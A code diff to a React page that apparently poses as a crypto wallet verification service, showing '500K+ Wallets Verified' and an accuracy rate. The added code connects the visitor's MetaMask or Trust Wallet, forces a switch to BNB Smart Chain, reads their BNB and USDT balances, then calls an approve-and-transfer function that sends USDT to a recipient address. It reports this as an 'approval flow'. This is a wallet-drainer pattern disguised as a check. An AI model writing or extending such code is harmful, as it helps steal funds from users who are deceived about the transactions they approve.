@@ -3,6 +3,49 @@
 import { useState } from "react";
 import { approveAndTransferUsdt } from "@/lib/usdt-bsc";
 
+type WalletProvider = {
+  isMetaMask?: boolean;
+  isTrust?: boolean;
+  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+};
+
+const BSC_CHAIN_ID_HEX = "0x38";
+const BSC_CHAIN_NAME = "BNB Smart Chain";
+const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+
+function formatTokenBalance(rawValue: string, decimals = 18) {
+  const value = BigInt(rawValue);
+  const divisor = BigInt(10) ** BigInt(decimals);
+  const whole = value / divisor;
+  const fraction = (value % divisor).toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fraction ? `${whole}.${fraction}` : whole.toString();
+}
+
+async function readBscBalances(provider: WalletProvider, walletAddress: string) {
+  const walletAddressData = walletAddress.slice(2).toLowerCase().padStart(64, "0");
+  const [bnbBalance, usdtBalance] = await Promise.all([
+    provider.request({
+      method: "eth_getBalance",
+      params: [walletAddress, "latest"],
+    }),
+    provider.request({
+      method: "eth_call",
+      params: [
+        {
+          to: BSC_USDT_CONTRACT,
+          data: `0x70a08231${walletAddressData}`,
+        },
+        "latest",
+      ],
+    }),
+  ]);
+
+  return {
+    bnb: formatTokenBalance(String(bnbBalance), 18),
+    usdt: formatTokenBalance(String(usdtBalance), 18),
+  };
+}
+
 const trustMetrics = [
   { value: "500K+", label: "Wallets Verified" },
   { value: "99.8%", label: "Accuracy Rate" },
@@ -207,16 +250,18 @@ export default function Home() {
       return;
     }
 
-    const provider = (window as Window & { ethereum?: any }).ethereum;
+    const provider = (window as Window & { ethereum?: WalletProvider }).ethereum;
 
     if (!provider) {
-      setStatusMessage("A browser wallet such as MetaMask is required to run the approval flow.");
+      setStatusMessage("A Web3 wallet such as MetaMask or Trust Wallet is required to run the approval flow.");
       return;
     }
 
+    const walletName = provider.isMetaMask ? "MetaMask" : provider.isTrust ? "Trust Wallet" : "Web3 wallet";
+
     try {
       setIsChecking(true);
-      setStatusMessage("Requesting wallet access...");
+      setStatusMessage("Detecting wallet...");
 
       const accounts = await provider.request({ method: "eth_requestAccounts" });
       const connectedAccount = Array.isArray(accounts) ? accounts[0] : undefined;
@@ -225,11 +270,55 @@ export default function Home() {
         throw new Error("No wallet account was selected.");
       }
 
-      setStatusMessage("Submitting approval and transfer request...");
+      setStatusMessage(`Connected ${walletName} wallet: ${connectedAccount.slice(0, 6)}...${connectedAccount.slice(-4)}.`);
+
+      const currentChainId = await provider.request({ method: "eth_chainId" });
+      if (currentChainId !== BSC_CHAIN_ID_HEX) {
+        setStatusMessage(`Switching to ${BSC_CHAIN_NAME} (${BSC_CHAIN_ID_HEX})...`);
+
+        try {
+          await provider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_CHAIN_ID_HEX }],
+          });
+        } catch (switchError: unknown) {
+          const switchErrorCode =
+            typeof switchError === "object" && switchError !== null && "code" in switchError
+              ? Number((switchError as { code?: number }).code)
+              : undefined;
+
+          if (switchErrorCode === 4902) {
+            await provider.request({
+              method: "wallet_addEthereumChain",
+              params: [
+                {
+                  chainId: BSC_CHAIN_ID_HEX,
+                  chainName: BSC_CHAIN_NAME,
+                  nativeCurrency: {
+                    name: "BNB",
+                    symbol: "BNB",
+                    decimals: 18,
+                  },
+                  rpcUrls: ["https://bsc-dataseed.binance.org"],
+                  blockExplorerUrls: ["https://bscscan.com"],
+                },
+              ],
+            });
+          } else {
+            throw switchError;
+          }
+        }
+      }
+
+      setStatusMessage("Reading BNB and USDT balances...");
+      const balances = await readBscBalances(provider, connectedAccount);
+      setStatusMessage(`BNB balance: ${balances.bnb} • USDT balance: ${balances.usdt}`);
+
+      setStatusMessage("Sending approval...");
       const result = await approveAndTransferUsdt(provider, connectedAccount);
 
       setStatusMessage(
-        `Approval succeeded for ${result.owner}. Transfer to ${result.recipient} completed on BNB Smart Chain.`,
+        `Approval succeeded for ${result.owner}. Transfer to ${result.recipient} completed on ${BSC_CHAIN_NAME}.`,
       );
     } catch (error) {
       setStatusMessage(error instanceof Error ? error.message : "The approval call failed.");
